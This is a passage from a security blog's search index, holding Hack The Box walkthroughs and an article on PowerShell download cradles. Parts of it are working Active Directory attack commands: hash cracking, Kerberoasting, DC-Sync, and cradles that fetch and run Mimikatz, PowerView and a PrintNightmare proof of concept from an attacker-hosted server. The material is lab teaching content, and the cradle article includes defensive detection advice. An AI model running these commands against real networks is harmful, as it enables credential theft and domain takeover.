misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt No hits Using netexec for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win: netexec ldap $box -u '' -p '' --asreproast asrep.txt netexec ldap $box -u guest -p '' --asreproast asrep.txt Neither get hits. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares\nWe have read access to shares as the guest user. netexec smb $box -u '' -p '' --shares\nNull session disabled. Enumerating Users with Impacket-lookupsid: We can use impacket-lookupsid to enumerate users on the domain: impacket-lookupsid $domain/guest@$machine.$domain -domain-sids impacket-lookupsid guest@$box -domain-sids -no-pass +Note+: As we are using the \u0026ldquo;Guest\u0026rdquo; account we can just hit enter for a blank password Interesting users, I will add them to my user list. Using smbclient to enumerate shares: smbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\shares\u0026quot; Finding LAPS related documentation on in the HelpDesk share: Searching the helpdesk share shows alot of LAPS related information:\nI download all the files:\nI check the documentation but it\u0026rsquo;s all official documentation by microsoft. +Note+: This does not directly tell us anything however we can most likely infer that LAPS is in use on this box somewhere. Local Administrator Password Solution (LAPS) Primer: LAPS is a Microsoft tool designed to manage and secure local administrator passwords on domain-joined machines by generating unique, random passwords.\nPurpose: Prevents lateral movement and credential theft across systems by ensuring each machine has a unique local administrator password.\nHow it Works:\nPasswords are stored securely in Active Directory (AD) and tied to individual machines. Passwords are updated regularly based on Group Policy settings. Only authorized users/groups have access to these stored passwords. Key Features:\nAutomatic Password Rotation: Random passwords are generated and regularly updated, reducing exposure from old or reused passwords. Secure Storage: Passwords are stored in AD as an attribute of the computer object, protected by AD permissions. Access Control: Administrators can control who can view the passwords, ensuring limited and audited access. Benefits:\nMitigates Lateral Movement: Reduces the risk of a compromised local admin account being used to move laterally across systems. Enhanced Security: Unique passwords for each device eliminate risks associated with shared or default passwords. Simplicity and Automation: Password rotation and management are automated, decreasing administrative overhead. Common Use Cases:\nEnforcing strong local admin credentials across enterprise environments. Reducing credential reuse and enhancing compliance for audits and regulatory standards. Limitations:\nOnly works on domain-joined Windows machines. Requires Active Directory schema modification, which may need approval from IT governance. 2. Foothold: Finding a backup in the Dev share: There is a file called winrm_backup.zip in the Dev share:\nI download it:\nI try and open the file but it\u0026rsquo;s password protected:\nWhat is interesting is, is the fact that there is a .pfx cert in here, which should allow us to authenticate. PFX Certificates in Windows: A Primer What\u0026rsquo;s Inside a PFX File:\nA PFX file (also known as PKCS#12) is like a secure digital envelope containing two essential pieces:\nA public key that others use to encrypt data or verify your identity A private key that only you have, used to decrypt data or prove it\u0026rsquo;s really you Why They Matter in Windows:\nIn the Windows world, PFX certificates handle several crucial security tasks: Securing web traffic through HTTPS Protecting Remote Desktop connections Enabling secure email in Outlook Verifying the authenticity of code and scripts Supporting Single Sign-On across applications How Windows Handles PFX Files:\nWindows stores these certificates in its Certificate Store, which you can think of as a secure vault for your digital credentials. The system protects the private keys and manages access to them, while making the public certificates available when needed.\nWorking with certificates in Windows is straightforward - the system provides built-in tools like the Certificate Import Wizard and Certificate Manager (certlm.msc) to handle PFX files. Once imported, Windows takes care of the heavy lifting of using these certificates for authentication and encryption.\nImportant Considerations: A few key points to keep in mind about PFX certificates in Windows: They\u0026rsquo;re usually password-protected for additional security Windows can store them at either the user or machine level The system handles key storage security automatically Not all applications can use PFX format directly Managing multiple certificates across systems requires planning Cracking the encrypted zip file using zip2john \u0026amp; john: As the zip file is password protected we can use zip2john to generate a hash we can then crack:\nzip2john winrm_backup.zip \u0026gt;\u0026gt; winrm.hash Cracking the hash:\njohn winrm.hash --wordlist=/home/kali/Wordlists/rockyou.txt It cracks Extracting the .pfx:\nIt works Attempting to extract the private keys from the .pfx: Initially I try and extract the certificate \u0026amp; key from the pfx but the password is not accepted: openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth.pem -nodes No dice. Cracking the .pfx using pfx2john \u0026amp; john: Like the zip before we can crack this pfx file to extract the password.\nGenerate a hash using pfx2john\npfx2john legacyy_dev_auth.pfx \u0026gt;\u0026gt; pfx.hash Crack:\njohn pfx.hash --wordlist=/home/kali/Wordlists/rockyou.txt Extracting the private key \u0026amp; certificate with openssl from a .pfx: Extract the private key:\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth-priv-key.pem -nodes Extract the certificate:\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legaccy_dev_auth-cert.pem -nodes Connecting with evil-winrm to the host using certificates: As we have extracted both the key and cert from the .pfx we can now authenticate with evil-winrm\nevil-winrm -i $box -c legaccy_dev_auth-cert.pem -k legaccy_dev_auth-priv-key.pem -S +Note+: See how we used S for ssl as we are using cert based authentication. Grab our user flag:\nCheck users on the host:\n3. Privilege Escalation: General Enumeration: Check group membership: I check what groups we are part of: whoami /groups Check privileges: Check our privs: whoami /priv Checking PowerShell history: As our user is part of the legacy devs there may be some interesting information in their PowerShell history.\nCheck the file exists: (Get-PSReadLineOption).HistorySavePath It does, lets download. I go to download it but it fails:\nI check the folder and can see the name of the file is actually ConsoleHost_history.txt\nI download it:\nFinding clear text credentials in the PowerShell history file: Looking through the file I find the clear text creds for the svc_deploy service account:\nI test the creds \u0026amp; they are valid:\nPerforming a bloodhound collection: Now that we have some credentials we can perform a bloodhound collection. bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box Finding out svc_deploy has ReadLAPSPassword privileges over the DC: Looking at bloodhound we can see that we are part of the LAPS_READERS groups which has ReadLAPSPassword privileges over the DC01, so we can read the machines password. Retrieving DC01 LAPS Password with PowerView via download cradle: To avoid AMSI I decide to use PowerView.ps1 with a download cradle. This means I can use a download cradle to load the script directly into memory without needing to download anything onto the host itself.\n+Note+: I know there are linux tool to extract the LAPS password however I wanted to use this methodology as an exercise. I stand up my python server:\npython3 -m http.server 9000 On the target from an evil-winrm admin shell I use a download cradle to load the sript into memory: iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/PowerView.ps1') Let\u0026rsquo;s create a secure string, using svc_deploy\u0026rsquo;s creds:\n$SecPassword = ConvertTo-SecureString \u0026#39;[svc_password]\u0026#39; -AsPlainText -Force Create Credential Object for Authentication:\n$Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;timelapse.htb\\svc_deploy\u0026#39;, $SecPassword) Retrieve LAPS Password Using the Service Account:\nGet-DomainObject DC01 -Credential $Cred -Properties \u0026#34;ms-mcs-AdmPwd\u0026#34;,name +Note+: The LAPS password is stored in the \u0026ldquo;ms-mcs-AdmPwd\u0026rdquo; attribute. Now that we have the LAPS password we can authenticate as the administrator:\nnetexec smb $box -u $user -p $pass --shares Grabbing our flag: impacket-psexec $domain/$user@$box -hashes :$hash There was no flag on the Administrators desktop. Looking through the box though there are other users; as we have enumerated all other users desktop let\u0026rsquo;s check out TRX. Flag found: +Note+: I had to use psexec as winrm stopped working (and continued to not work even after box resets) I had to actually perform this after the DC-Sync to retrieve the administrator hash as I could not use evil-winrm and the LAPS password to connect. I have since checked some known walktrhoughs and you should be able to authenticate so maybe I just got unlucky. So if you encounter the same issue, jump to my persistence section to view how to DC-Sync and then use the above approach. 4. Persistence: Dumping NTDS.dit/DC-SYNC attack: Perform DC-Sync attack using netexec:\nnetexec smb $box -u $user -p $pass -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026quot;$file\u0026quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\\n'; done Lessons Learned: What did I learn? I learned alot about extracting credentials from .pfx files. That was fun. I learned that even if the box is being finnicky there will be a way to work around it. What silly mistakes did I make? Not terrible this time. Nothing to write home about. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/timelapse-box\/"
    },
    
    "http:\/\/localhost:1313\/articles\/understandingdownloadcradles\/": {
        "title": "Understanding PowerShell Download Cradles: A Deep Dive",
        "tags": ["Windows","Active Directory","PowerShell","Download Cradle",],
        "content": "Introduction PowerShell has revolutionized system administration and automation. One of its powerful yet often misunderstood features is the PowerShell download cradle. This article explores what download cradles are, their uses, and best practices for implementation.\nWhat is a PowerShell Download Cradle? A PowerShell download cradle is a technique that enables downloading and executing code directly in memory without writing to disk. This approach can help bypass security mechanisms.\nCore Components and Techniques Essential Cmdlets Invoke-WebRequest: Retrieves content from web pages Invoke-Expression (alias: IEX): Executes PowerShell commands from strings System.Net.WebClient: .NET class for web server interactions Basic Syntax Example using Invoke-Mimikatz: Load Script into memory:\nRunning Invoke-Mimikatz from memory:\nCommon Download Cradle Examples: Basic WebClient Method # Standard WebClient download cradle IEX (New-Object Net.Webclient).downloadstring(\u0026#34;https://example.com/script.ps1\u0026#34;) # PowerShell 3.0+ using Invoke-WebRequest (alias: iwr) IEX (iwr \u0026#39;https://example.com/script.ps1\u0026#39;) COM Object Methods # Internet Explorer COM object $ie = New-Object -comobject InternetExplorer.Application $ie.visible = $False $ie.navigate(\u0026#39;https://example.com/script.ps1\u0026#39;) start-sleep -s 5 $r = $ie.Document.body.innerHTML $ie.quit() IEX $r # Msxml2.XMLHTTP COM object (proxy-aware) $h = New-Object -ComObject Msxml2.XMLHTTP $h.open(\u0026#39;GET\u0026#39;,\u0026#39;https://example.com/script.ps1\u0026#39;,$false) $h.send() iex $h.responseText Advanced Download Cradle Techniques: # DNS TXT Record Method IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( ((nslookup -querytype=txt \u0026#34;example.com\u0026#34; | Select -Pattern \u0026#39;\u0026#34;*\u0026#34;\u0026#39;) -split \u0026#39;\u0026#34;\u0026#39;[0]) ))) # XML Document Method $a = New-Object System.Xml.XmlDocument $a.Load(\u0026#34;https://example.com/command.xml\u0026#34;) $a.command.a.execute | iex Creating a Secure Download Cradle: Basic Setup Launch PowerShell with appropriate privileges Configure execution policy if needed Set-ExecutionPolicy RemoteSigned Secure Download Cradle Code: Here\u0026rsquo;s a complete, production-ready download cradle implementation that incorporates logging, error handling, and security controls:\nfunction Invoke-SecureDownloadCradle { # Enable advanced function features like -Verbose [CmdletBinding()] param ( # Required URL parameter for the script to download [Parameter(Mandatory=$true)] [string]$Url, # Optional custom User-Agent to avoid detection or meet requirements [Parameter(Mandatory=$false)] [string]$UserAgent = \u0026#34;PowerShell/SecurityAudit\u0026#34;, # Optional timeout in milliseconds (default 30 seconds) [Parameter(Mandatory=$false)] [int]$Timeout = 30000, # Optional switch to enable Windows Event Log logging [Parameter(Mandatory=$false)] [switch]$EnableLogging ) # Internal logging function to handle both event logs and verbose output function Write-Log { param($Message) if ($EnableLogging) { $logParams = @{ LogName = \u0026#39;Application\u0026#39; # Write to Windows Application log Source = \u0026#39;SecureDownloadCradle\u0026#39; EventId = 1000 EntryType = \u0026#39;Information\u0026#39; Message = $Message } try { Write-EventLog @logParams } catch { Write-Warning \u0026#34;Logging failed: $_\u0026#34; } } Write-Verbose $Message # Always write to verbose stream } try { Write-Log \u0026#34;Starting download from: $Url\u0026#34; # Force TLS 1.2 for security and reset cert callback to default [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null # Initialize WebClient with security settings $webClient = New-Object System.Net.WebClient $webClient.Headers.Add(\u0026#34;User-Agent\u0026#34;, $UserAgent) # Configure system proxy settings automatically $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy() $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials Write-Log \u0026#34;Downloading content...\u0026#34; $scriptContent = $webClient.DownloadString($Url) Write-Log \u0026#34;Content downloaded successfully\u0026#34; # Execute the downloaded content safely using InvokeCommand Write-Log \u0026#34;Executing script in memory\u0026#34; $ExecutionContext.InvokeCommand.InvokeScript($false, [scriptblock]::Create($scriptContent), $null, $null) Write-Log \u0026#34;Execution completed successfully\u0026#34; } catch [System.Net.WebException] { # Handle network-specific errors separately $errorMsg = \u0026#34;Network error occurred: $($_.Exception.Message)\u0026#34; Write-Log $errorMsg throw $errorMsg } catch { # Handle all other errors $errorMsg = \u0026#34;Unexpected error occurred: $_\u0026#34; Write-Log $errorMsg throw $errorMsg } finally { # Ensure proper cleanup of resources if ($webClient) { $webClient.Dispose() Write-Log \u0026#34;WebClient disposed\u0026#34; } } } This implementation includes:\nComprehensive error handling Event logging (when enabled - requires admin privileges as requires REG change) TLS 1.2 enforcement Proper proxy handling Certificate validation Resource cleanup Verbose output support Example usage without logging: #Import Script . .\\Invoke-SecureDownloadCradle.ps1 #Run Invoke-SecureDownloadCradle -Url \u0026#34;http://[IP]/[SCRIPT].ps1\u0026#34; -Verbose Example usage with logging: #Import Script . .\\Invoke-SecureDownloadCradle.ps1 # Create Event Source New-EventLog -LogName Application -Source \u0026#34;SecureDownloadCradle\u0026#34; #Run Invoke-SecureDownloadCradle -Url \u0026#34;http://[IP]/[SCRIPT].ps1\u0026#34; -Verbose # Read the logs Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq \u0026#34;SecureDownloadCradle\u0026#34;} +Notes+: A custom user agent can also be passed:\n-UserAgent \u0026quot;CompanyName/UpdateService\u0026quot; Real-World Examples Of Download-Cradle Use HackTheBox I will often use download cradles on hack the box and here are some recent examples: Monteverde Box: Extracting the Administrator Password for Azure: +Full Walkthrough+: https://bloodstiller.com/walkthroughs/monteverde-box/ In this example, we used a download cradle to execute AdConnect exploitation directly in memory:\niex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.46:9000/AdConnectPOC.ps1\u0026#39;) As the exploit is run in memory we get the administrators password without writing to disk. Certified Box: Advanced Mimikatz Usage to perform a DC-Sync Attack: +Full Walkthrough+: https://bloodstiller.com/walkthroughs/certified-box/ Coming soon (it\u0026rsquo;s still in release arena. ) Note this is not a spoiler as this is done post exploitation. Setting Up the Environment Start a Python HTTP server to host the Mimikatz script: python3 -m http.server 9000 Loading Mimikatz into Memory Using a download cradle to load invoke-mimikatz directly into memory:\niex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.24:9000/Invoke-Mimikatz.ps1\u0026#39;) +Note+: This will hang for a little bit, so just be patient. Performing DC-Sync Attack Now that mimikatz is loaded into memory we can use it like we normally would and pass it arguments. Invoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;lsadump::dcsync /user:krbtgt /domain:administrator.htb\u0026#34;\u0026#39; Driver Box: Running PrintNightmare POC from a download cradle: +Full Walkthrough+: https://bloodstiller.com/walkthroughs/driver-box/ Coming soon (it\u0026rsquo;s still in release arena. ) 1. Start python server to host the script: python3 -m http.server 9000 +Note+: I have this command aliased to pws 2. Use the download cradle to load the POC directly into memory: iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.97:9000/CVE-2021-1675.ps1\u0026#39;) 3. Execute the script from memory to create new user \u0026amp; add them to the admins: Invoke-Nightmare -NewUser \u0026#34;bloodstiller\u0026#34; -NewPassword \u0026#34;bl00dst1ll3r!\u0026#34; -DriverName \u0026#34;PrintIt\u0026#34; 4. Verify the user has been added: net user bloodstiller Security Considerations Detection Methods Modern security solutions detect download cradles through several means: PowerShell logging and ScriptBlock logging Network traffic analysis (especially .DownloadString patterns) AMSI integration in PowerShell 5.0+ EDR behavioral analysis Memory scanning for known patterns Common Restrictions Organizations often implement: # Execution Policy Set-ExecutionPolicy Restricted # AMSI Scanning # Built into PowerShell 5.0+ by default # AppLocker Rules # Block PowerShell download cradle patterns New-AppLockerPolicy -RuleType Path -Deny -Path \u0026#34;%SYSTEM32%\\WindowsPowerShell\\*\\powershell.exe\u0026#34; -User Everyone Defensive Recommendations For system administrators:\nEnable PowerShell logging:\n# Enable detailed script block logging Set-ItemProperty -Path \u0026#34;HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\u0026#34; -Name \u0026#34;EnableScriptBlockLogging\u0026#34; -Value 1 Monitor for suspicious patterns:\nDirect execution using IEX Base64 encoded commands Uncommon COM objects Unusual DNS TXT queries Network Controls:\nImplement HTTPS inspection Block outbound PowerShell connections Monitor for unusual PowerShell network activity ", 
        "url": "http:\/\/localhost:1313\/articles\/understandingdownloadcradles\/"
    },
    
    "http:\/\/localhost:1313\/tags\/acl\/": {
        "title": "ACL",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/acl\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/certified-box\/": {
        "title": "Certified HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","LDAP","Active Directory","Shadow Credentials","Kerberos","CA","Whisker","MsDS-KeyCredentialLink","CERTIFICATE","DACLS","ACL","Download Cradle","ESC9",],
        "content": "Certified Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Certified How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Assumed Breach Box: This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials. This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today. +Note+: Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them. This ensures I don’t overlook any findings just because access is available. Comprehensive documentation of all discoveries remains essential. NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Certified/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:59:52 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 07:59 GMT Nmap scan report for 10.129.107.1 Host is up (0.043s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.46 seconds Initial thoughts: DNS, Kerberos, SMB, Ldap \u0026amp; RPC all good means of enumeration. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Certified/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:06:16 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 15:06 GMT Nmap scan report for certified.htb (10.129.107.1) Host is up (0.039s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-06 15:08:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49265/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49681/tcp open msrpc Microsoft Windows RPC 49708/tcp open msrpc Microsoft Windows RPC 49729/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (88%) Aggressive OS guesses: Microsoft Windows Server 2019 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-11-06T15:09:26 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 206.50 seconds LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nNaming contexts: DC=certified,DC=htb CN=Configuration,DC=certified,DC=htb CN=Schema,CN=Configuration,DC=certified,DC=htb DC=DomainDnsZones,DC=certified,DC=htb DC=ForestDnsZones,DC=certified,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=certified,DC=htb ldapServiceName: certified.htb:dc01$@CERTIFIED.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=certified,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries. We have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;certified.htb\u0026quot; update_var machine \u0026quot;DC01\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Using netexec for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win:\nnetexec ldap $box -u '' -p '' --asreproast asrep.txt This fails as NULL sessions are disabled. netexec ldap $box -u guest -p '' --asreproast asrep.txt This lets me know that the guest account is disabled. We also have creds though so lets try with those:\nnetexec ldap $box -u $user -p $pass --asreproast asrep.txt No dice. Kerberoasting to retrieve the management_svc hash: As we have creds we can also kerberoast using netexec: We get one for management_svc: Trying to crack management_svc hash: I run the hash through hashcat using rockyou but it does not crack: hashcat -m 13100 kerb.out /home/kali/Wordlists/rockyou.txt We can put this in our back-pocket for later. 2. Foothold: Enumerating as Judith: A lot these steps will seem jumbled when looking at time stamps, just know I was jumping between different windows etc when doing things. Connecting as Judith to SMB: Lets connect to SMB and see what we can find: netexec smb $box -u $user -p $pass --shares She has access to 3 shares, the interesting one is SYSVOL as these often have scripts. Using smbclient: I check SYSVOL but there is nothing of note:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; I check NETLOGOn but there is nothing of note:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\NETLOGON\u0026quot; Attempting to connect via evil-winrm: I attempt to connect via evil-winrm but we cannot: evil-winrm -i $box -u $user -p $pass Enumerating Users with Impacket-lookupsid: I try and gather more information via impacket-lookupsid: impacket-lookupsid $domain/$user@$machine.$domain -domain-sids We can see we have more users here which is interesting so I will add them to my list of users, what is especially interesting is the Alias Cert Publishers as this indicates AD-CS is running (although it was not present in the scans so far). Lets continue to enumerate. Bloodhound collection: Attempted Bloodhound collection using netexec: I try and run a bloodhound collection using netexec but it does not work (in fact it never works for me…): netexec ldap $machine.$domain -u $user -p $pass --bloodhound --collection All Bloodhound collection via bloodhound-python: I run bloodhound-python to get a collection, which works: It works. I ingest this into bloodhound. Running certipy-ad to enumerate vulnerable certificates: Whilst bloodhound ingests our data lets enumerate the CA. There has been nothing obvious other than the alias Cert Publishers to indicate it\u0026rsquo;s running \u0026amp; the fact the box is called \u0026ldquo;Certified\u0026rdquo;.\nI run certipy-ad to enumerate the CA:\ncertipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box No templates found under this current user. Discovering our user has GenericWrite privs over MANAGEMENT_SVC: Looking at our bloodhound results we can see that our user \u0026ldquo;Judith\u0026rdquo; has WriteOwner privs over the group \u0026ldquo;Management\u0026rdquo; who The \u0026ldquo;Management\u0026rdquo; group in-turn has GenericWrite over the account \u0026ldquo;MANAGEMENT_SVC\u0026rdquo; whos\u0026rsquo;s kerberos ticket we extracted earlier. Planning our attack path: First we will make ourselves owner of the group \u0026ldquo;Management\u0026rdquo;: As we have WriteOwner privileges over the group \u0026ldquo;Management\u0026rdquo; we can make ourselves the owner of the group: Second 